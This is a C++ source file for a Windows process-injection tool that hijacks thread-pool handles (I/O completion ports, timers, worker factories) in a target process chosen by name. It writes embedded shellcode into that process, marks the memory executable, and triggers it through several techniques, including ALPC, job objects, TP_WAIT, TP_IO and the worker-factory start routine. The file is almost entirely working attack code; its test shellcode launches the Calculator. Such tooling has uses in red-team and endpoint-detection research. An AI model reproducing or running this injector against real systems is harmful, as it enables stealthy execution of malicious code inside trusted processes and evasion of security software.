#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include "defs.hpp"
#include "injection.hpp"




// ** PROTOTYPES ** //

//IO
bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort);
bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort);
bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort);
bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort);
bool InjectViaTpDirect(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort);

//TIMER
bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void* payloadAddress, _In_ HANDLE targetProcess);

//WORKER FACTORY / TP_WORK
bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE hWorkerFactory, _In_ void* localPayloadAddress, _In_ size_t payloadSize);
bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hWorkerFactory);





HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handleTypeName, _In_ uint32_t desiredAccess) {


	fnNtQueryInformationProcess pQueryProcInfo = nullptr;
	fnNtQueryObject pQueryObject = nullptr;


	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessSnapshotInfo = nullptr;
	PPUBLIC_OBJECT_TYPE_INFORMATION objectInfo = nullptr;

	uint32_t totalHandles = NULL;	uint32_t handleInfoSize = NULL;
	NTSTATUS status = 0x00;			HANDLE duplicatedHandle = NULL;
	bool handleFound = false;		uint32_t objectTypeReturnLen = NULL;

	

	//NtQueryInformationProcess
	pQueryProcInfo = reinterpret_cast<fnNtQueryInformationProcess>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

	//NtQueryObject
	pQueryObject = reinterpret_cast<fnNtQueryObject>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryObject"));


	if (pQueryProcInfo == nullptr || pQueryObject == nullptr) {

		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}



	std::wcout << L"{+} Attempting to hijack handle of type: " << handleTypeName << std::endl;

	if (!GetProcessHandleCount(targetProcess, (PDWORD)&totalHandles)) { //Total number of handles we need to account for

		WIN32_ERR(GetProcessHandleCount);
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + (totalHandles * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));



	pProcessSnapshotInfo = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));
	if (pProcessSnapshotInfo == nullptr) {

		WIN32_ERR(Process Snapshot Info Heap Alloc);
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}


	status = pQueryProcInfo(
		targetProcess,
		(PROCESSINFOCLASS)51,
		pProcessSnapshotInfo, 
		handleInfoSize, 
		NULL);
	
	if (status != ERROR_SUCCESS) {

		NTAPI_ERR(NtQueryInformationProcess, status);
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}



	for (size_t i = 0; i < pProcessSnapshotInfo->NumberOfHandles; i++) {

		if (!DuplicateHandle(targetProcess,
			pProcessSnapshotInfo->Handles[i].HandleValue,
			GetCurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			FALSE,
			NULL)) {

			continue;
		}

		pQueryObject(duplicatedHandle,
			ObjectTypeInformation,
			NULL,
			NULL,
			(PULONG)&objectTypeReturnLen); //retrieve correct buffer size first


		objectInfo = static_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen));
		if (objectInfo == nullptr) {
			break;
		}

		status = pQueryObject(duplicatedHandle,
			ObjectTypeInformation,
			objectInfo,
			objectTypeReturnLen,
			NULL);

		if (status != ERROR_SUCCESS) {
			NTAPI_ERR(NtQueryObject, status);
			break;
		}
		

		if (wcsncmp(handleTypeName, objectInfo->TypeName.Buffer, wcslen(handleTypeName)) == 0) {

			std::wcout << L"{!} found \"" << objectInfo->TypeName.Buffer << L"\" handle! Hijacking successful." << std::endl;
			handleFound = true;
			break;
		}

		HeapFree(GetProcessHeap(), 0, objectInfo);
	}


	if (!handleFound) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
	}



FUNC_END:

	if (pProcessSnapshotInfo) {
		HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo);
	}

	if (objectInfo) {
		HeapFree(GetProcessHeap(), 0, objectInfo);
	}

	return duplicatedHandle;
}






// helpers
HANDLE hijackProcessIoPort(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
}


HANDLE hijackProcessTimerQueue(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"IRTimer", TIMER_ALL_ACCESS);
}

HANDLE hijackProcessWorkerFactory(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
}









HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) {

	uint32_t PidArray[2048] = { 0 };		wchar_t moduleBaseName[250] = { 0 };
	uint32_t sModulebaseName = 0;			uint32_t bytesReturned = 0;
	uint32_t bytesNeeded = 0;				uint32_t totalNumberOfPids = 0;

	HANDLE hProcess = nullptr;
	HMODULE hModule = nullptr;
	bool foundProcess = false;


	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
		WIN32_ERR(K32EnumProcesses);
		return INVALID_HANDLE_VALUE;
	}

	totalNumberOfPids = bytesReturned / sizeof(uint32_t);


	for (size_t i = 0; i < totalNumberOfPids; i++) {

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidArray[i]);
		if (hProcess == NULL) {
			continue;
		}

		uint32_t moduleEnumBytesNeeded = 0;
		if (!K32EnumProcessModules(hProcess, &hModule, sizeof(hModule), (LPDWORD)&moduleEnumBytesNeeded)) {
			continue;
		}

		if (!K32GetModuleBaseNameW(hProcess, hModule, moduleBaseName, sizeof(moduleBaseName) / sizeof(wchar_t))) {
			continue;
		}

		if (wcscmp(moduleBaseName, processName) == 0) {
			
			std::wcout << L"{+} Got a handle to process: " << processName << L" with PID: " << PidArray[i] << std::endl;
			foundProcess = true;
			break;
		}

		memset(moduleBaseName, 0x00, sizeof(moduleBaseName));
	}


	return(foundProcess ? hProcess : INVALID_HANDLE_VALUE);
}





bool writePayloadIntoProcess(_In_ HANDLE hProcess, _In_ void* pPayload, _In_ size_t payloadSize,  _Out_ void** pRemoteAddress) {

	void* remote = VirtualAllocEx(hProcess,
		nullptr,
		payloadSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remote == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}

	size_t bytesWritten = 0;
	if (!WriteProcessMemory(hProcess,
		remote,
		pPayload,
		payloadSize,
		&bytesWritten) || bytesWritten != payloadSize) {

		WIN32_ERR(WriteProcessMemory);
		std::cout << "Bytes written :" << bytesWritten << " | Payload Size :" << payloadSize << std::endl;
		return false;
	}

	uint32_t oldProtect;
	if (!VirtualProtectEx(hProcess, remote, payloadSize, PAGE_EXECUTE_READ, (PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx);
		return false;
	}

	*pRemoteAddress = remote;

	std::cout << "{+} Wrote Shellcode Into Remote Process: " << remote << std::endl;
	return true;
}












// Calc payload for testing
unsigned char Shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00

};



class Process {

private:

	wchar_t* name = nullptr;
	HandleHijackClass hijackType;

	HANDLE processHandle = nullptr;
	uint32_t PID = 0;

	HANDLE handleToHijack = nullptr;
	void* remotePayload = nullptr;

	bool isInitialized = false;


public:

	bool injectShellcode() {

		if (!isInitialized)
			return false;

		return writePayloadIntoProcess(processHandle, Shellcode, sizeof(Shellcode), &remotePayload);
	}

	
	// IO
	bool ProcessAlpcInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpIoPort) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaAlpc(processHandle, remotePayload, handleToHijack);
	}

	bool ProcessJobInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpIoPort) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaJobCallback(processHandle, remotePayload, handleToHijack);
	}

	bool ProcessWaitInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpIoPort) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaTpWait(processHandle, remotePayload, handleToHijack);
	}

	bool ProcessTpIoInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpIoPort) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaTpIo(processHandle, remotePayload, handleToHijack);
	}

	bool ProcessTpDirectInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpIoPort) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaTpDirect(processHandle, remotePayload, handleToHijack);
	}



	// TIMER
	bool ProcessTimerInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpTimer) {
			return false;
		}

		HANDLE hWorkerFactory = hijackProcessWorkerFactory(processHandle);
		if (hWorkerFactory == INVALID_HANDLE_VALUE) {
			return false;
		}

		return InjectViaTpTimer(hWorkerFactory, handleToHijack, remotePayload, processHandle);
	}



	// WORK
	bool ProcessWorkInject() {

		if (!isInitialized || remotePayload == nullptr || hijackType != TpWorkerFactory) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaTpWork(processHandle, remotePayload, handleToHijack);
	}

	bool ProcessWorkerFactoryInject() {

		if (!isInitialized || hijackType != TpWorkerFactory) {
			std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
			return false;
		}

		return InjectViaWorkerFactoryStartRoutine(processHandle, handleToHijack, Shellcode, sizeof(Shellcode));
	}





	bool init() {

		//
		// Find Target process
		//

		processHandle = enumerateProcess(name, &PID);
		if (processHandle == INVALID_HANDLE_VALUE) {

			std::wcerr << L"{!!} Failed to get handle to process: " << name << std::endl;
			return false;
		}


		//
		// Hijack Handle
		//

		switch (this->hijackType) {

			case TpIoPort:
				handleToHijack = hijackProcessIoPort(processHandle);
				break;

			case TpTimer:
				handleToHijack = hijackProcessTimerQueue(processHandle);
				break;

			case TpWorkerFactory:
				handleToHijack = hijackProcessWorkerFactory(processHandle);
				break;

			default:
				return false;
		}

		if (handleToHijack == INVALID_HANDLE_VALUE) {
			
			std::cerr << "{!!} Failed to hijack process handle needed." << std::endl;
			return false;
		}



		std::cout << "{+} Initialization Successful." << std::endl;
		return (isInitialized = true);
	}


	~Process(){

		if (handleToHijack) {
			CloseHandle(handleToHijack);
		}

		if (processHandle) {
			CloseHandle(processHandle);
		}
	}


	Process(wchar_t* processName, HandleHijackClass hijackType) : name(processName), hijackType(hijackType) {}
};









int wmain(int argc, wchar_t** argv) {


	if (argc < 4) {

		std::cout << "Usage: \n" <<
			"1: [Target Process]\n" <<
			"2: [Injection Type] - Options: \"/ioport\", \"/timer\", \"/workerfactory\"\n\n" <<
			"3: [Subtypes] - Options: \n\t{\"work\", \"startroutine\"}: for /workerfactory\n" <<
			"\t{\"wait\", \"jobobject\", \"alpc\", \"direct\", \"tpio\"}: for /ioport\n" <<
			"\t{\"tptimer\"}: for /timer\n";
	}
	

	HandleHijackClass handleType;

	switch ( *(reinterpret_cast<uint64_t*>(argv[2])) ) {

		case ARGUMENT_IOPORT:
			handleType = TpIoPort;
			break;

		case ARGUMENT_TIMER:
			handleType = TpTimer;
			break;

		case ARGUMENT_WORKERFACTORY:
			handleType = TpWorkerFactory;
			break;

		default:
			std::wcerr << L"\n{!!} Invalid Command Line Argument Supplied: " << argv[2] << std::endl;
			return -1;
	}
	

	Process targetProcess(argv[1], handleType);

	if (!targetProcess.init()) {
		return -1;
	}

	if (wcscmp(argv[3], L"startroutine") != 0) {
		if (!targetProcess.injectShellcode())
			return -1;
	}



	bool succeeded = false;
	switch (*(reinterpret_cast<uint64_t*>(argv[3]))) {

		case SUBTYPE_WORKERFACTORY_STARTROUTINE:
			succeeded = targetProcess.ProcessWorkerFactoryInject();
			break;

		case SUBTYPE_WORKERFACTORY_WORK:
			succeeded = targetProcess.ProcessWorkInject();
			break;


		case SUBTYPE_IOPORT_ALPC:
			succeeded = targetProcess.ProcessAlpcInject();
			break;
	
		case SUBTYPE_IOPORT_DIRECT:
			succeeded = targetProcess.ProcessTpDirectInject();
			break;

		case SUBTYPE_IOPORT_JOBOBJECT:
			succeeded = targetProcess.ProcessJobInject();
			break;

		case SUBTYPE_IOPORT_TPIO:
			succeeded = targetProcess.ProcessTpIoInject();
			break;

		case SUBTYPE_IOPORT_WAIT:
			succeeded = targetProcess.ProcessWaitInject();
			break;


		case SUBTYPE_TIMER_TPTIMER:
			succeeded = targetProcess.ProcessTimerInject();
			break;


		default:
			std::wcerr << L"\n{!!} Invalid Injection Subtype Sent: " << argv[3] << std::endl;
			break;
	}


	if (!succeeded) {
		return -1;
	}




	std::cout << "{+} Finished successfully." << std::endl;



	return 0;
}